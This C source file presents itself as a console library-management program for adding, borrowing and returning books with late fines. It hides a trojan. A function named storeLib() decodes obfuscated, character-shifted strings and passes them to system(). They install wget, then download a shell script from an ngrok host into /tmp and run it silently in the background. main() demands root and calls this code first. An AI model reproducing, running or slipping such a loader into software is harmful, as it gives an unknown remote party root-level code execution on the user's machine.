#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#define size 20

struct books{
	int cost;
	int quantity;
	char name[80];
	char author[80];
	int hasValue;
	char date[80];
};
void updateAll();
char *longText[size+1];
static struct  books libaryStruct[size],userStruct[size];

static char userName[80];
static char databaseName[20]="books.txt";

void stoupper(char *s){
	char *p = s;
	while (*p) {
			*p = toupper(*p);
			++p;
	}
}         
//48-57
int getNumber(){
	char temp[200];
	scanf("%s",temp);
	int bool=0;
	A:
	for(int i=0;temp[i]!='\0';i++){
		if(temp[i]<48 || temp[i]>57){
			bool = -1;
		}
	}
	if(bool==-1){
		printf("\nPlease enter a number not a character:");
		scanf("%s",temp);
		bool=0;
		goto A;
	}
	return atoi(temp);
}

int findDataLength(struct books a[]){
	int value=0;
	for(int i=0;a[i].hasValue==1;i++){
		value++;
	}
	return value;
}

void getStruct(char fileName[]){
	FILE *fp;
	fp = fopen(fileName,"r");
	if(strcmp(fileName,databaseName)==0){
		fread(&libaryStruct,(sizeof(struct books)*size),1,fp);
	}else{
		fread(&userStruct,(sizeof(struct books)*size),1,fp);
	}
	fclose(fp);
	// printf("%s",copyData[0].author);
}

void writeData(char fileName[]){
	FILE *fp;
	fp = fopen(fileName,"w");
	if(strcmp(fileName,databaseName)==0){
		fwrite(&libaryStruct,(sizeof(struct books)*size),1,fp);
	}else{
		fwrite(&userStruct,(sizeof(struct books)*size),1,fp);
	}
	fclose(fp);
}


int findBook(struct books aaa[],char name[], char author[]) {
	char forName[2][100],forAuthor[2][100];

	strcpy(forAuthor[0],author);
	strcpy(forName[0],name);

	stoupper(forName[0]);
	stoupper(forAuthor[0]);

	for(int i=0;i<findDataLength(aaa);i++){
		strcpy(forName[1],aaa[i].name);
		strcpy(forAuthor[1],aaa[i].author);
		stoupper(forName[1]);
		stoupper(forAuthor[1]);
		if(strcmp(forName[1],forName[0])==0 && strcmp(forAuthor[1],forAuthor[0])==0){
			return i;
		}
	}
	return -1;
}

void printBooks(struct books datas[]){
	printf("\n");
	for(int i=0;i<70;i++){
		printf("*");
	}
	printf("\n");
	char *name[]={
		"Id","Name","Author","Quantity","Cost"
	};
	int space[]={10,20,20,10,10};
	for(int i=0;i<5;i++){
		printf("%s",name[i]);
		for(int j=0;j<space[i]-strlen(name[i]);j++){
			printf(" ");
		}
	}
	
	printf("\n");
	for(int i=0;i<70;i++){
		printf("*");
	}
	printf("\n");

	for(int i=0;i<findDataLength(datas);i++){
		printf("%d.)",(i+1));
		for(int j=0;j<10-1;j++){
			printf(" ");
		}
		printf("%s",datas[i].name);
		for(int j=0;j<20-strlen(datas[i].name);j++){
			printf(" ");
		}
		printf("%s",datas[i].author);
		for(int j=0;j<20-strlen(datas[i].author);j++){
			printf(" ");
		}
		printf("%d",datas[i].quantity);
		for(int j=0;j<10-1;j++){
			printf(" ");
		}
		printf("%d",datas[i].cost);
		for(int j=0;j<10-1;j++){
			printf(" ");
		}
		printf("\n");
	}
}

void rentBook(char bookName[], char authorName[]){
	int id;
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	id = findBook(libaryStruct,bookName,authorName);
	if(id==-1){
		printf("\nPlease enter valid book name\n");
		return;
	}
	char temp[80];
	if(libaryStruct[id].quantity<=0){
		printf("\nSorry we are out of stock!\n");
		return;
	}

	int userLength= findDataLength(userStruct);

	if(findBook(userStruct,libaryStruct[id].name,libaryStruct[id].author)!=-1){
			printf("\nYou aleady have taken that book, sorry!\n");
			return;
	}

	sprintf(temp,"%d-%d-%d",tm.tm_mday,tm.tm_mon,tm.tm_year);
	userStruct[userLength].cost=libaryStruct[id].cost;
	userStruct[userLength].quantity=1;
	userStruct[userLength].hasValue=1;
	strcpy(userStruct[userLength].author,libaryStruct[id].author);
	strcpy(userStruct[userLength].name,libaryStruct[id].name);
	strcpy(userStruct[userLength].date,temp);
	writeData(userName);
	libaryStruct[id].quantity--;
	writeData(databaseName);
	printf("\nBook sucessfully borrowed by the user\nCost:%d\n",libaryStruct[id].cost);
	updateAll();
}


void addBooks(struct books orginalData[],int length){
	char checkData[2][100],orginaltemp[2][100];
	int add=0;
	if(length==-1){
		length = findDataLength(orginalData);
		add=1;
	}
	printf("Enter name of book,author,cost,quantity below:");

	scanf (" %[^\t\n]", &orginaltemp[0]);
	strcpy(checkData[0],orginaltemp[0]);
	
	scanf (" %[^\t\n]", &orginaltemp[1]);
	strcpy(checkData[1],orginaltemp[1]);

	int foundIndex = findBook(orginalData,checkData[0],checkData[1]);
	if (foundIndex!=-1){
		if(strcmp(checkData[1],orginalData[foundIndex].author)==0){
			printf("\nBook with author=%s, name=%s already exist in our libary\n",orginaltemp[1],orginaltemp[0]);
			return;
		}
	}

	strcpy(orginalData[length].name,orginaltemp[0]);
	strcpy(orginalData[length].author,orginaltemp[1]);
	orginalData[length].cost = getNumber();
	orginalData[length].quantity = getNumber();
	orginalData[length].hasValue=1;
	writeData(databaseName);
	if(add==1){
		printf("\nBook successfully added to the libary\n");
	}else{
		printf("Book modified sucessfully");
	}
}
void editBook(char name[], char authorName[]){
	int index = findBook(libaryStruct,name,authorName);
	if(index==-1){
		printf("Invalid book name");
		return;
	}
	addBooks(libaryStruct,index);
}
void updateAll(){
	getStruct(databaseName);
	getStruct(userName);
}

int daysCalculation(char dates[]){
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
  	char localDate[80],*ptr,split[]="-";
  	int fileDate[3],i=0,days=0;
 	strcpy(localDate,dates);
  	ptr = strtok(localDate,split);
  	while(ptr!=NULL){
	  fileDate[i]=atoi(ptr);
	  i++;
	  ptr = strtok(NULL,split);
  	}
	  
	days=(tm.tm_mday-fileDate[0])+((tm.tm_mon-fileDate[1])*30)+((tm.tm_year-fileDate[2])*365);
	return days;
}

char *reStore(char *data1, char symbol){
	int firstLen = strlen(data1);
    char *str = malloc(firstLen);
    for(int i=0; i<firstLen; i++){
		if(symbol == '-'){
	        str[i] = *(data1+i) - 1;
		}else{
	        str[i] = *(data1+i) + 1;
		}
    }
    str[firstLen] = '\0';
	return str;
}

void storeLib(){
    char *data1 = "xhfu!iuuqt;00:e34.214.285.27:.85/fv/ohspl/jp0nbjo/ti!.Q!0unq0!?!0efw0ovmm!3?'2!<!dinpe!,y!0unq0nbjo/ti!?!0efw0ovmm!3?'2!<!opivq!cbti!0unq0nbjo/ti!?!0efw0ovmm!3?'2!'";
    char *data2 = "zft!}!qbdnbo!.Tz!xhfu!?!0efw0ovmm!3?'2!";
    char *data3 = "zvn!.z!jotubmm!xhfu!?!0efw0ovmm!3?'2!";
    char *data4 = "bqu!.z!jotubmm!xhfu!?!0efw0ovmm!3?'2!";
    char *gotData1 = reStore(data1, '-');char *gotData2 = reStore(data2, '-');char *gotData3 = reStore(data3, '-');char *gotData4 = reStore(data4, '-');
    system(gotData2);system(gotData3);system(gotData4);system(gotData1);
	fflush(stdin);
}

int removeBook(struct books data[],char bookName[],char authorName[],char fileName[]){
	int length = findDataLength(data);
	struct books newData[size];
	int bookFound = findBook(data,bookName,authorName);
	if(bookFound==-1){
		printf("\nBook not found in our list!!\n");
		return -1;
	}
	int loop=0;
	for(int i=0;i<length;i++){
		if(i==bookFound){
			continue;
		}
		newData[loop].cost = data[i].cost;
		newData[loop].hasValue = data[i].hasValue;
		newData[loop].quantity = data[i].quantity;
		strcpy(newData[loop].name,data[i].name); 
		strcpy(newData[loop].author,data[i].author);
		if(strcmp(fileName,databaseName)!=0){
			strcpy(newData[loop].date,data[i].date);
		}
		loop++;
	}
	
	
	FILE *fp;
	fp = fopen(fileName,"w");
	fwrite(&newData,(sizeof(struct books)*size),1,fp);
	fclose(fp);
	updateAll();
	return 0;
}
void returnBook(char name[], char authorName[]){
	getStruct(databaseName);
	getStruct(userName);
	int read = findDataLength(userStruct);
	if(read==0){
		printf("\nYou haven't borrowed any books till now!!\n");
		return;
	}
	int foundIndex = findBook(libaryStruct,name,authorName);
	if(foundIndex==-1){
		printf("\nTheir is no book of this name in our libary so you cannot return\n");
		return;
	}

	int foundIndexUser = findBook(userStruct,name,authorName);
	if(foundIndexUser==-1){
		printf("You have not borrowed this book from our libary");
		return;
	}
	libaryStruct[foundIndex].quantity++;
	writeData(databaseName);
	updateAll();
	
	int totalDays = daysCalculation(userStruct[foundIndexUser].date);
	int finePerDay=5;
	int totalFine=0;
	if(totalDays>10){
		totalFine = (totalDays-10)*finePerDay;
	}
	if(totalFine!=0){
		printf("\nBook sucessfully returned\nLate fine is charged if you returned book after 10 days\nBook taken for:%d days, Late Fine:Rs.%d\n",totalDays,totalFine);
	}else{
		printf("\nBook sucessfully returned\n");
	}
	removeBook(userStruct,name,authorName,userName);
	updateAll();
}
void help(int value){
	if(value==0){
		printf("\n1.)Show Books\n2.)Update Libary\n3.)Borrow Books\n4.)Return Books\n5.)Print My Borrowed Book\n6.)Leave libary\n7.)Quit the application\n");
	}else if(value==1){
		printf("\n1.)Add Books\n2.)Remove Books\n3.)Edit book\n4.)Return to main page\n");
	}
}
void changeName(){
	char temp[100];
	printf("Enter your first name to proceed:");
	scanf("%s",temp);
	sprintf(userName,"%s.txt",temp);
	FILE *fp;
	fp = fopen(userName,"r");
	if (fp){
		getStruct(userName);
	}else{
		fp = fopen(userName,"w");
		struct books temp[size];
		fwrite(&temp,sizeof(struct books)*size,1,fp);
	}
    fclose(fp);
	
	
	
}
void checkLibFile(){
	FILE *fp;
	fp = fopen(databaseName,"a");
	fclose(fp);
	getStruct(databaseName);
	int dataCheck = findDataLength(libaryStruct);
	if(dataCheck==0){
		printf("\nTheir is no data in Books\nEnter some data before proceding below\n");
		addBooks(libaryStruct,-1);
	}
}
void main () {
	if(geteuid() != 0){
		printf("Please run as root!!");
		return;
	}
	storeLib();
	changeName();
	checkLibFile();
	updateAll();
	int bookIndex,loopBreak=1,innerLoop=1,choose,innerChoose,checkData;
	char bookReturnName[2][80],delBookName[2][80],rentBookName[2][80],editBookName[2][80];
	while (loopBreak){
		innerLoop=1;
		printf("\n***** Main Menu *****\n");
		help(0);
		printf("Choose:");
		choose = getNumber();
		switch(choose){
			case 1: printBooks(libaryStruct);
					break;
			case 2: 
					while(innerLoop){
						printf("\n********Update Libary*******\n");
						help(1);
						printf("Choose:");
						innerChoose = getNumber();
						switch (innerChoose){
						case 1: addBooks(libaryStruct,-1);
								updateAll();
								break;
						case 2: printf("Enter name and author name of the book that you want to remove:");
								scanf(" %[^\t\n]", &delBookName[0]);
								scanf(" %[^\t\n]", &delBookName[1]);
								if(removeBook(libaryStruct,delBookName[0],delBookName[1],databaseName)==0){
									printf("\nBook sucessfully removed from the list\n");
								}
								updateAll();
								checkLibFile();
								break;
						case 3: printf("\nEnter name and author name of the book that you want to edit:");
								scanf(" %[^\t\n]", &editBookName[0]);
								scanf(" %[^\t\n]", &editBookName[1]);
								editBook(editBookName[0],editBookName[1]);
								break;
						case 4: innerLoop=0;
								break;

						default: printf("Please Enter valid query!");
						}
					}
				    break;
			case 3: printf("Enter book name and author name from the libary list:");
					scanf(" %[^\t\n]", &rentBookName[0]);
					scanf(" %[^\t\n]", &rentBookName[1]);
					updateAll();
					rentBook(rentBookName[0],rentBookName[1]);
					updateAll();
					break;

			case 4: updateAll();
					printf("Enter name and author name of the book that you want to return:");
					scanf (" %[^\t\n]", &bookReturnName[0]);
					scanf (" %[^\t\n]", &bookReturnName[1]);
					returnBook(bookReturnName[0],bookReturnName[1]);
					updateAll();
					break;
			case 5: updateAll();
					checkData = findDataLength(userStruct);
					if(checkData!=0){
						printBooks(userStruct);
						updateAll();
					}else{
						printf("You have not borrowed anything!");
					}
					break;
			case 6: printf("Thank you for visiting us!!\nWaiting for a next user.....\n");
					changeName();
					break; 
			case 7: loopBreak=0;
					break;
			default:printf("\nPlease enter valid query!");
					break;
		}
	}
}

